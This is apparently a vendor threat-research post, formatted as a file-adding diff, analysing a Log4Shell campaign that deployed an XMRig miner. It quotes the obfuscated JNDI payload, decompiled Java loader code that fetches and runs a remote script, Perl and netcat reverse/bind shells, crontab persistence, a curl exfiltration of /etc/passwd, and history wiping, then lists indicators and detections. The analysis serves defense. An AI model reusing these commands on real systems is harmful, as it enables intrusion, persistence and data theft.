@@ -1,0 +1,140 @@
+
+Key points
+
+Despite being over two years old, the Log4j vulnerability (Log4Shell) remains a persistent and evolving threat, as demonstrated by a recent opportunistic campaign leveraging it for crypto-mining and system compromise.
+The attack uses obfuscated LDAP requests to evade detection, leading to the execution of malicious scripts on compromised systems.
+The script establishes persistence, performs system reconnaissance, and exfiltrates data, maintaining control through multiple backdoors and encrypted communication channels.
+Background
+On November 24, 2021, Security Researcher Chen Zhajun discovered a critical vulnerability in Apache Log4j, a Java-based library used for logging. Log4Shell (CVE-2021-44228) received a CVSS score of 10 out of 10, indicating severe risk. This vulnerability allows threat actors to execute remote code, compromising systems globally. Log4j’s widespread use across numerous applications and services makes it a prime target for exploitation.
+Since its discovery, numerous threat groups have exploited Log4Shell. Nation-state actors, cybercriminals, and opportunistic hackers have all leveraged this vulnerability. Groups like APT41, a China-linked cyber espionage unit, and Conti, a notorious ransomware gang, have integrated Log4Shell exploits into their operations.
+Opportunistic threat actors
+On July 30, 2024, one of our Confluence honeypots built with HASH  received what appeared to be a traditional Log4Shell exploitation probe from 185.220.101[.]34, a known Tor exit node. Upon further analysis, we discovered a new opportunistic campaign leading to XMRig deployment for crypto mining.
+
+
+Attack flow
+Analysis of the campaign
+The attack payload is a conventional exploit targeting the Log4j vulnerability, with slight obfuscation to evade detection.
+//obfuscated
+${jNd${13%25f:-${13%27f:-i:}}ldap://44-211-80-168-i80.superr[.]buzz:1389/rmr}
+
+//deobfuscated
+${jNdi:ldap://44-211-80-168-i80.superr[.]buzz:1389/rmr}
+In a vulnerable Java application, Java will call the LDAP URL, retrieve the Java class URL, and execute it through JNDI.
+We were able to simulate the process by calling LDAP directly:
+$ ldapsearch -x -LLL -H ldap://44-211-80-168-i80.superr[.]buzz:1389/rmr
+
+dn:
+objectClass: JavaNamingReference
+javaClassName: xUnknown
+javaFactory: xExportObject
+javaCodeBase: http://185.159.82[.]103:8000
+We downloaded the class from http://185.159.82[.]103:8000/xExportObject.class. Then, after decompiling the malicious Java class, we got the source code as shown in the snippet below:
+// xExportObject.class
+
+import java.util.Hashtable;
+import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+
+public class xExportObject implements ObjectFactory {
+   public xExportObject() {
+      Runtime.getRuntime().exec("touch /tmp");
+      super();
+
+      try {
+         try {
+            Runtime.getRuntime().exec("curl -s http://nfdo[.]shop/lte -o /tmp/lte").waitFor();
+         } catch (Exception var2) {
+            Runtime.getRuntime().exec("wget -q -O /tmp/lte http://nfdo[.]shop/lte").waitFor();
+         }
+
+         Runtime.getRuntime().exec("chmod +x /tmp/lte").waitFor();
+         Runtime.getRuntime().exec("/bin/sh -c /tmp/lte").waitFor();
+      } catch (Exception var3) {
+         var3.printStackTrace();
+      }
+   }
+   public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
+      return null;
+   }
+}
+The class executes a series of commands to download and run a malicious script.
+The below Java Class creates a file /tmp, then leverages the Runtime.getRuntime().exec method to download an obfuscated bash script utilizing curl or wget from http://nfdo[.]shop/lte.
+lte tries to obfuscate its content by setting a very long variable that looks like Base64 content. This variable is then set to the actual Base64 payload, which is then executed.
+
+
+The lte script then begins doing some reconnaissance. It retrieves the total memory available on the system by reading /proc/meminfo or getting the number of available cores via nproc. The script then downloads an XMRig payload (componist) from http://nfdo[.]shop/componist and configures the cryptocurrency miner with the following configuration.
+conf='{"autosave":false,"pools":[{"url":"cmpnst[.]info:443","tls":true}]}'
+The script then sets persistence based on user privileges. If the user is root and systemd is available, the script sets up a systemd service for persistent execution. If systemd is not available, it sets up a cron job using crontab to ensure the payload runs on system reboot. For non-root users, the script creates necessary directories and sets up a local systemd user service or a cron job for persistence.
+crontab -l; echo "@reboot $homedir/.local/bin/componist $suffix >/dev/null 2>&1" | crontab || echo "@reboot $homedir/.local/bin/componist $suffix >/dev/null 2>&1" >> /etc/crontabs/$whoami
+The script then configures a reverse shell with a Perl one-liner, which sets up a backdoor allowing remote control of the compromised system. This reverse shell listens on different ports based on the user privileges and the availability of systemd.
+perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in(985,INADDR_ANY));listen(S,SOMAXCONN);for(;accept(C,S);){while (<C>){if(/sockaddr/){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");system("/bin/sh -i");close(STDIN);close(STDOUT);close(STDERR);close(C);}}}'
+To maintain persistence, it configures an additional reverse shell using nc (netcat) on port 2826, 826,  or 1826  and GPG for encrypted communication using the passphrase daemon, ensuring the command execution over the network remains encrypted to evade detection.
+nc -lp 826 | gpg --decrypt --batch --passphrase daemon | /bin/sh
+The script collects detailed system information, including CPU details lscpu, OS version via /etc/issue, user information by reading /etc/passwd, listening TCP sockets using ss -tl, group memberships, running processes, and system uptime.
+The collected data is then exfiltrated to a remote server using curl in an HTTP POST request.
+curl -s -X POST http://nfdo[.]shop/fanfic.php -H "Content-Type: application/x-www-form-urlencoded" -d "pass=banizaza&nproc=$nproc&mem=$mem&whoami=$whoami&homedir=$homedir&os=$os&lscpu=$lscpu&etc_passwd=$etc_passwd&etc_passwd_line=$etc_passwd_line&ss_tl=$ss_tl&in_sudo=$in_sudo&uname_a=$uname_a&df_h=$df_h&last=$last&top=$top&ps_componist=$ps_componist&in_docker=$in_docker"
+The script then concludes with a defense evasion tactic by removing itself, clearing bash history by redirecting /dev/null into bash_history. If the history command is available, the script then clears the current shell's command history.
+if [ -f ~/.bash_history ]; then
+  cat /dev/null > ~/.bash_history
+fi
+
+if command -v history >/dev/null 2>&1; then
+  history -c
+fi
+Thanks to our security agent, we were able to get a good overview of the execution flow of lte script within few minutes, resulting in the following executions:
+
+
+Indicators of compromise
+185.220.101[.]34 IP address exploiting log4shell
+superr[.]buzz
+cmpnst[.]info
+nfdo[.]shop
+rirosh.shop
+e4edfa8c6891f6815c05e73852212207cc454a42496d1a109e750c660368b5c1  /tmp/lte
+5441be217e98051c284d584e830f9a7fc2153143fafee0dc9f6af197cec6c8c9  /bin/rcd
+2ac2877c9e4cd7d70673c0643eb16805977a9b8d55b6b2e5a6491db565cee1f  /bin/componist
+4f11db82193aebe710585b2faefd2b904b6fe6636f7dc25541cea0dd31adada4  /bin/nfdo
+How Datadog can help
+Datadog Security products provide various means to detect this behavior.
+Application Security Management
+Datadog Application Security can detect Log4Shell exploits in Java applications by detecting Log4Shell payloads and monitoring the second-stage Java class call. If this detection rule finds the Java class call, it will generate a critical signal indicating successful attack.
+Cloud Security Management (CSM)
+CSM Vulnerabilities can identify applications vulnerable to Log4Shell, and CSM Threats can detect various stages of post-exploitation activity, including:
+
+Vulnerable Java applications spawning suspicious child processes
+Using wget or curl to download stagers
+Executable bit added to newly created file
+Exfiltrating data using via wget or curl
+185.220.101[.]34
+http://185.159.82[.]103:8000/xExportObject.class
+/tmp
+Runtime.getRuntime().exec
+curl
+wget
+http://nfdo[.]shop/lte
+lte
+lte
+/proc/meminfo
+nproc
+componist
+http://nfdo[.]shop/componist
+systemd
+systemd
+systemd
+crontab
+systemd
+systemd
+nc
+2826
+826
+1826
+daemon
+lscpu
+/etc/issue
+/etc/passwd
+ss -tl
+curl
+/dev/null
+bash_history
+lte
